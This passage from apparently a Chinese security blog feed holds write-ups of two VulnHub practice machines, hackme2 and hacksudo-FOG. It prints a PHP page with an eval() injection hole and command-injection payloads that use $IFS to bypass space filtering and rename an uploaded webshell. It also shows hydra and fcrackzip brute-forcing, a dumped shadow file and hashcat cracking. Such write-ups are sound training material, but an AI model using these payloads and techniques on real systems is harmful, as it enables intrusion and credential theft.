$imageFileType&#x3D;&#x3D;&quot;php5&quot;) &#123;</span><br><span class="line">    echo &quot;Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed.&quot;;</span><br><span class="line">    $uploadOk &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Check if $uploadOk is set to 0 by an error</span><br><span class="line">if ($uploadOk &#x3D;&#x3D; 0) &#123;</span><br><span class="line">    echo &quot;Sorry, your file was not uploaded.&quot;;</span><br><span class="line">&#x2F;&#x2F; if everything is ok, try to upload file</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if (move_uploaded_file($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;], $target_file)) &#123;</span><br><span class="line">        echo &quot;The file &quot;. basename( $_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]). &quot; has been uploaded to the uploads folder.&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Sorry, there was an error uploading your file.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;br&gt;</span><br><span class="line">&lt;&#x2F;br&gt;</span><br><span class="line">&lt;&#x2F;br&gt;</span><br><span class="line">&lt;&#x2F;br&gt;</span><br><span class="line">&lt;&#x2F;br&gt;</span><br><span class="line">    This is a feature still undergoing testing.</span><br><span class="line">    You can search for users activity here:</span><br><span class="line">    &lt;form action&#x3D;&quot;welcomeadmin.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">        &lt;&#x2F;br&gt;</span><br><span class="line">        First Name:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot; id&#x3D;&quot;fname&quot;&gt;</span><br><span class="line">        &lt;&#x2F;br&gt;</span><br><span class="line">        Last Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;lname&quot; id&#x3D;&quot;lname&quot;&gt;</span><br><span class="line">        &lt;&#x2F;br&gt;</span><br><span class="line">        &lt;&#x2F;br&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Search User&quot; name&#x3D;&quot;search&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;br&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    $fname &#x3D; $_POST[&quot;fname&quot;];</span><br><span class="line">    $lname &#x3D; $_POST[&quot;lname&quot;];</span><br><span class="line">    $lname &#x3D; preg_replace(&#39;&#x2F;[;\s]&#x2F;&#39;,&#39;&#39;,$lname);</span><br><span class="line">    if($fname&#x3D;&#x3D;&quot;&quot; || $fname&#x3D;&#x3D;&quot; &quot; || $lname&#x3D;&#x3D;&quot;&quot; || $lname&#x3D;&#x3D;&quot; &quot;)&#123;</span><br><span class="line">        echo &quot;You have to search with both First and Last name&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;The system is checking the backend for user: &quot;.$fname .&quot; &quot;.$lname.&quot; &quot;;</span><br><span class="line">        echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">        echo &quot;User &quot;. $fname. &quot; &quot;;</span><br><span class="line">        eval(&quot;echo &quot;.$lname.&quot;;&quot;);</span><br><span class="line">        echo &quot; cannot be found&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>eval(&quot;echo &quot;.$lname.&quot;;&quot;);</code>命令执行语句，那么我们利用 ``</li>
</ul>
<p><img data-src="./hackme2/16.png" alt></p>
<p>过滤空格，用<code>&lt;</code>代替</p>
<h3 id="拿到反弹shell"><a href="#拿到反弹shell" class="headerlink" title="拿到反弹shell"></a>拿到反弹shell</h3><ul>
<li>上传<code>png</code> <code>php</code>木马 + 修改文件后缀名</li>
</ul>
<p>过滤空格，<del>用<code>&lt;&gt;</code>代替</del> <code>$IFS</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fname&#x3D;1&amp;lname&#x3D;system(&quot;mv&lt;&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;caiji_phpinfo13_15.png&lt;&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;caiji_phpinfo13_15.php&quot;)&amp;search&#x3D;Search+User</span><br><span class="line"></span><br><span class="line">### 纠正</span><br><span class="line">fname&#x3D;1&amp;lname&#x3D;system(&quot;mv$IFS&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;caiji_phpinfo13_15.png$IFS&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;caiji_phpinfo13_15.php&quot;)&amp;search&#x3D;Search+User</span><br></pre></td></tr></table></figure>

<p><del>靶机做了防火墙，上传小马会被<code>ban</code></del></p>
<p><img data-src="./hackme2/17.png" alt></p>
<p><img data-src="./hackme2/18.png" alt></p>
<p><img data-src="./hackme2/19.png" alt></p>
<ul>
<li>哥斯拉</li>
</ul>
<p><img data-src="./hackme2/20.png" alt></p>
<p>本地环境有问题 GG</p>
<ul>
<li><code>weevely</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">weevely generate 4396 shell.php</span><br></pre></td></tr></table></figure>

<p>失败</p>
<ul>
<li>经历了好久 哥斯拉终于 上线</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fname=<span class="number">1</span>&amp;lname=system(<span class="string">'mv$IFS/var/www/html/uploads/year2020/666.png$IFS/var/www/html/uploads/year2020/666.php'</span>)&amp;search=Search+User</span><br></pre></td></tr></table></figure>

<p><img data-src="./hackme2/21.png" alt></p>
<ul>
<li>提权部分和<code>hackme</code>同理</li>
</ul>
<p><img data-src="./hackme2/22.png" alt></p>
<p><img data-src="./hackme2/23.png" alt></p>
<ul>
<li>上传反弹马，反弹出<code>shell</code></li>
</ul>
<p><img data-src="./hackme2/24.png" alt></p>
<p><img data-src="./hackme2/25.png" alt></p>
<ul>
<li>拿到 <code>root</code></li>
</ul>
<p><img data-src="./hackme2/26.png" alt></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一直得不到<code>shell</code>的原因</p>
<p>绕过空格 要用<code>$IFS</code> 而不是<code>&lt;&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&gt;&gt;1</span><br><span class="line"></span><br><span class="line">mv$IFS&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;1$IFS&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;111.php</span><br><span class="line">mv&lt;&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;1&lt;&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;222.php</span><br><span class="line"></span><br><span class="line">cat 111.php</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">root@hackme:&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020# cat 111.php</span><br><span class="line">cat 111.php</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##############</span><br><span class="line">cat 222.php</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">root@hackme:&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020# cat 222.php</span><br><span class="line">cat 222.php</span><br></pre></td></tr></table></figure>

<p>如果用 <code>&lt;&gt;</code>绕</p>
<p><img data-src="./hackme2/27.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>hackme2</tag>
      </tags>
  </entry>
  <entry>
    <title>hacksudo-FOG</title>
    <url>/2021/05/21/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo-FOG/</url>
    <content><![CDATA[<h1 id="hacksudo-FOG"><a href="#hacksudo-FOG" class="headerlink" title="hacksudo-FOG"></a>hacksudo-FOG</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>hacksudo-FOG</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/hacksudo-FOG]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:51, IPv4: 192.168.43.189</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1	26:ca:cd:37:40:d8	(Unknown: locally administered)</span><br><span class="line">192.168.43.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line">192.168.43.227	08:00:27:d5:81:bf	PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.964 seconds (130.35 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.227</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.43.227</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/hacksudo-FOG]</span><br><span class="line">└─# nmap -sC -sV -p- 192.168.43.227</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-21 03:27 EDT</span><br><span class="line">Nmap scan report for 192.168.43.227</span><br><span class="line">Host is up (0.00060s latency).</span><br><span class="line">Not shown: 65524 closed ports</span><br><span class="line">PORT      STATE SERVICE   VERSION</span><br><span class="line">21/tcp    open  ftp       Pure-FTPd</span><br><span class="line">22/tcp    open  ssh       OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 62:ce:1b:7d:4e:24:0f:8a:c1:c9:ea:c4:1e:21:a7:f3 (RSA)</span><br><span class="line">|   256 92:04:5a:0a:86:62:b3:ba:00:f3:82:6a:c9:8d:ae:6d (ECDSA)</span><br><span class="line">|_  256 74:c5:7c:9f:8d:06:ee:0c:54:5e:65:b2:30:42:98:49 (ED25519)</span><br><span class="line">80/tcp    open  http      Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Hacksudo FOG</span><br><span class="line">111/tcp   open  rpcbind   2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  3           2049/udp   nfs</span><br><span class="line">|   100003  3           2049/udp6  nfs</span><br><span class="line">|   100003  3,4         2049/tcp   nfs</span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3      34620/udp   mountd</span><br><span class="line">|   100005  1,2,3      34987/tcp   mountd</span><br><span class="line">|   100005  1,2,3      36393/udp6  mountd</span><br><span class="line">|   100005  1,2,3      60373/tcp6  mountd</span><br><span class="line">|   100021  1,3,4      38913/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      41725/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      56617/udp   nlockmgr</span><br><span class="line">|   100021  1,3,4      58264/udp6  nlockmgr</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049/udp   nfs_acl</span><br><span class="line">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="line">443/tcp   open  ssl/https Apache/2.4.38 (Debian)</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Hacksudo FOG</span><br><span class="line">2049/tcp  open  nfs_acl   3 (RPC #100227)</span><br><span class="line">3306/tcp  open  mysql     MySQL 5.5.5-10.3.27-MariaDB-0+deb10u1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1</span><br><span class="line">|   Thread ID: 91</span><br><span class="line">|   Capabilities flags: 63486</span><br><span class="line">|   Some Capabilities: Support41Auth, FoundRows, ConnectWithDatabase, IgnoreSigpipes, LongColumnFlag, Speaks41ProtocolOld, SupportsTransactions, InteractiveClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsCompression, ODBCClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: @vT&#125;;LLw39a_8;^H/Q)w</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">34987/tcp open  mountd    1-3 (RPC #100005)</span><br><span class="line">38913/tcp open  nlockmgr  1-4 (RPC #100021)</span><br><span class="line">51869/tcp open  mountd    1-3 (RPC #100005)</span><br><span class="line">60381/tcp open  mountd    1-3 (RPC #100005)</span><br><span class="line">MAC Address: 08:00:27:D5:81:BF (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.04 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./hacksudo-FOG/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.227/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u http://192.168.43.227/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.227/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/21 03:27:39 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.php            (Status: 302) [Size: 0] [--&gt; /fog/index.php]</span><br><span class="line">/index.html           (Status: 200) [Size: 853]                   </span><br><span class="line">/index1.html          (Status: 200) [Size: 329]                   </span><br><span class="line">/cms                  (Status: 301) [Size: 314] [--&gt; http://192.168.43.227/cms/]</span><br><span class="line">/dict.txt             (Status: 200) [Size: 1798]                                </span><br><span class="line">/fog                  (Status: 301) [Size: 314] [--&gt; http://192.168.43.227/fog/]</span><br><span class="line">/server-status        (Status: 403) [Size: 279]                                 </span><br><span class="line">                                                                                </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/21 03:35:10 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line">gobuster dir -u http://192.168.43.227/cms/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u http://192.168.43.227/cms/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.227/cms/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              php,html,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/21 03:35:45 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.php            (Status: 200) [Size: 19839]</span><br><span class="line">/modules              (Status: 301) [Size: 322] [--&gt; http://192.168.43.227/cms/modules/]</span><br><span class="line">/uploads              (Status: 301) [Size: 322] [--&gt; http://192.168.43.227/cms/uploads/]</span><br><span class="line">/doc                  (Status: 301) [Size: 318] [--&gt; http://192.168.43.227/cms/doc/]    </span><br><span class="line">/admin                (Status: 301) [Size: 320] [--&gt; http://192.168.43.227/cms/admin/]  </span><br><span class="line">/assets               (Status: 301) [Size: 321] [--&gt; http://192.168.43.227/cms/assets/] </span><br><span class="line">/lib                  (Status: 301) [Size: 318] [--&gt; http://192.168.43.227/cms/lib/]    </span><br><span class="line">/config.php           (Status: 200) [Size: 0]                                           </span><br><span class="line">/tmp                  (Status: 301) [Size: 318] [--&gt; http://192.168.43.227/cms/tmp/]    </span><br><span class="line">                                                                                        </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/21 03:41:59 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./hacksudo-FOG/2.png" alt></p>
<ul>
<li>发现密码文件<a href="http://192.168.43.227/dict.txt" target="_blank" rel="noopener">http://192.168.43.227/dict.txt</a></li>
</ul>
<h3 id="FTP破解"><a href="#FTP破解" class="headerlink" title="FTP破解"></a>FTP破解</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra 192.168.43.227 ftp -l hacksudo -P ./dict.txt -vV</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/hacksudo-FOG]</span><br><span class="line">└─# hydra 192.168.43.227 ftp -l hacksudo -P ./dict.txt -vV</span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-21 04:19:29</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 196 login tries (l:1/p:196), ~13 tries per task</span><br><span class="line">[DATA] attacking ftp://192.168.43.227:21/</span><br><span class="line">[VERBOSE] Resolving addresses ... [VERBOSE] resolving done</span><br><span class="line">[ATTEMPT] target 192.168.43.227 - login "hacksudo" - pass "hacker" - 1 of 196 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.43.227 - login "hacksudo" - pass "hackers" - 2 of 196 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.43.227 - login "hacksudo" - pass "hacker1" - 3 of 196 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.43.227 - login "hacksudo" - pass "loveshack" - 4 of 196 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.43.227 - login "hacksudo" - pass "hacked" - 5 of 196 [child 4] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.43.227 - login "hacksudo" - pass "mhacky" - 6 of 196 [child 5] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.43.227 - login "hacksudo" - pass "hackett" - 7 of 196 [child 6] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.43.227 - login "hacksudo" - pass "hackney" - 8 of 196 [child 7] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.43.227 - login "hacksudo" - pass "mhack" - 9 of 196 [child 8] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.43.227 - login "hacksudo" - pass "hacking" - 10 of 196 [child 9] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.43.227 - login "hacksudo" - pass "dothack" - 11 of 196 [child 10] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.43.227 - login "hacksudo" - pass "jhacky" - 12 of 196 [child 11] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.43.227 - login "hacksudo" - pass "ihatehackers" - 13 of 196 [child 12] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.43.227 - login "hacksudo" - pass "radioshack" - 14 of 196 [child 13] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.43.227 - login "hacksudo" - pass "hackme" - 15 of 196 [child 14] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.43.227 - login "hacksudo" - pass "jhack" - 16 of 196 [child 15] (0/0)</span><br><span class="line">[21][ftp] host: 192.168.43.227   login: hacksudo   password: hackme</span><br><span class="line">[STATUS] attack finished for 192.168.43.227 (waiting for children to complete tests)</span><br><span class="line">[ERROR] Not an FTP protocol or service shutdown: </span><br><span class="line">[ERROR] Not an FTP protocol or service shutdown: </span><br><span class="line">[VERBOSE] Retrying connection for child 15</span><br><span class="line">[VERBOSE] Retrying connection for child 12</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-21 04:20:01</span><br></pre></td></tr></table></figure>

<p>获得账号密码<code>hacksudo / hackme</code></p>
<ul>
<li>登录FTP</li>
</ul>
<p><img data-src="./hacksudo-FOG/3.png" alt></p>
<ul>
<li><code>zip</code>压缩包存在密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fcrackzip  -D -p ./dict.txt  -u ./secr3tSteg.zip</span><br><span class="line"></span><br><span class="line">fcrackzip  -D -p /usr/share/wordlists/rockyou.txt -u ./secr3tSteg.zip</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi/vulnhub/hacksudo-FOG]</span><br><span class="line">└─# fcrackzip  -D -p /usr/share/wordlists/rockyou.txt -u ./secr3tSteg.zip                                                                                                                                      130 ⨯</span><br><span class="line">PASSWORD FOUND!!!!: pw == fooled</span><br></pre></td></tr></table></figure>

<h3 id="SoundStegno"><a href="#SoundStegno" class="headerlink" title="SoundStegno"></a>SoundStegno</h3><ul>
<li>解压发现</li>
</ul>
<p><img data-src="./hacksudo-FOG/4.png" alt></p>
<ul>
<li>发现<code>github</code>地址</li>
</ul>
<p><img data-src="./hacksudo-FOG/5.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 ExWave.py -f hacksudoSTEGNO.wav</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo-FOG/6.png" alt></p>
<ul>
<li><code>vigenere</code>解密</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Your Secret Message is: Shift by 3</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">DEFGHIJKLMNOPQRSTUVWXYZABC</span><br><span class="line">zzzz.orfdokrvw/irj Xvhuqdph=irj:sdvvzrug=kdfnvxgrLVUR</span><br></pre></td></tr></table></figure>

<p><a href="https://www.dcode.fr/vigenere-cipher" target="_blank" rel="noopener">https://www.dcode.fr/vigenere-cipher</a></p>
<p><img data-src="./hacksudo-FOG/7.png" alt></p>
<ul>
<li>自动解密得到</li>
</ul>
<p><img data-src="./hacksudo-FOG/8.png" alt></p>
<p>得到账号密码<code>wwww.localhost/fog Username=fog:password=hacksudoISRO</code></p>
<h3 id="登入web后台"><a href="#登入web后台" class="headerlink" title="登入web后台"></a>登入web后台</h3><p><img data-src="./hacksudo-FOG/9.png" alt></p>
<ul>
<li>发现此<code>cms</code>版本号为<code>2.2.5</code></li>
<li>查找漏洞信息</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit CMS Made Simple</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo-FOG/10.png" alt></p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><ul>
<li>修改<code>POC</code>如下</li>
</ul>
<p><img data-src="./hacksudo-FOG/11.png" alt></p>
<ul>
<li>拿到<code>shell</code></li>
</ul>
<p><img data-src="./hacksudo-FOG/12.png" alt></p>
<ul>
<li>反弹<code>shell</code></li>
</ul>
<p><img data-src="./hacksudo-FOG/13.png" alt></p>
<ul>
<li>发现<code>suid</code></li>
</ul>
<p><img data-src="./hacksudo-FOG/14.png" alt></p>
<p><img data-src="./hacksudo-FOG/15.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root:$6$zHA6yDSHPcoPX7dX$2oZJxM7gBzhQIT049d4MuR7jAypyZpDPoo6aKQfkJAfJNKF/CgY1GYFCu.Wb5cB6713Zjtzgk.ls0evZ6YToD/:18756:0:99999:7:::</span><br><span class="line">daemon:*:18751:0:99999:7:::</span><br><span class="line">bin:*:18751:0:99999:7:::</span><br><span class="line">sys:*:18751:0:99999:7:::</span><br><span class="line">sync:*:18751:0:99999:7:::</span><br><span class="line">games:*:18751:0:99999:7:::</span><br><span class="line">man:*:18751:0:99999:7:::</span><br><span class="line">lp:*:18751:0:99999:7:::</span><br><span class="line">mail:*:18751:0:99999:7:::</span><br><span class="line">news:*:18751:0:99999:7:::</span><br><span class="line">uucp:*:18751:0:99999:7:::</span><br><span class="line">proxy:*:18751:0:99999:7:::</span><br><span class="line">www-data:*:18751:0:99999:7:::</span><br><span class="line">backup:*:18751:0:99999:7:::</span><br><span class="line">list:*:18751:0:99999:7:::</span><br><span class="line">irc:*:18751:0:99999:7:::</span><br><span class="line">gnats:*:18751:0:99999:7:::</span><br><span class="line">nobody:*:18751:0:99999:7:::</span><br><span class="line">_apt:*:18751:0:99999:7:::</span><br><span class="line">systemd-timesync:*:18751:0:99999:7:::</span><br><span class="line">systemd-network:*:18751:0:99999:7:::</span><br><span class="line">systemd-resolve:*:18751:0:99999:7:::</span><br><span class="line">systemd-coredump:!!:18751::::::</span><br><span class="line">messagebus:*:18751:0:99999:7:::</span><br><span class="line">sshd:*:18751:0:99999:7:::</span><br><span class="line">mysql:!:18751:0:99999:7:::</span><br><span class="line">_rpc:*:18751:0:99999:7:::</span><br><span class="line">statd:*:18751:0:99999:7:::</span><br><span class="line">tftp:*:18751:0:99999:7:::</span><br><span class="line">ftpuser:!:18751:0:99999:7:::</span><br><span class="line">isro:$6$DMdxcRB0fQbGflz2$39vmRyBB0JubEZpJJN13rSzssMQ6t1R6KXLSPjOmpImsyuWqyXHneT8CH0nKr.XDEzKIjt1H3ndbNzirCjOAa/:18756:0:99999:7:::</span><br><span class="line">dnsmasq:*:18756:0:99999:7:::</span><br></pre></td></tr></table></figure>

<ul>
<li><code>hashcat</code>破解密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hashcat --force -m 1800 -a 0 ./shadow.txt /usr/share/wordlists/rockyou.txt -o ./results.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">6<span class="variable">$DMdxcRB0fQbGflz2</span><span class="variable">$39vmRyBB0JubEZpJJN13rSzssMQ6t1R6KXLSPjOmpImsyuWqyXHneT8CH0nKr</span>.XDEzKIjt1H3ndbNzirCjOAa/:qwerty</span></span><br></pre></td></tr></table></figure>

<h3 id="登入isro"><a href="#登入isro" class="headerlink" title="登入isro"></a>登入isro</h3><ul>
<li>直接拿到<code>root</code></li>
</ul>
<p><img data-src="./hacksudo-FOG/16.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hacksudo</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>hacksudo-ProximaCentauri</title>
    <url>/2021/07/04/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo-ProximaCentauri/</url>
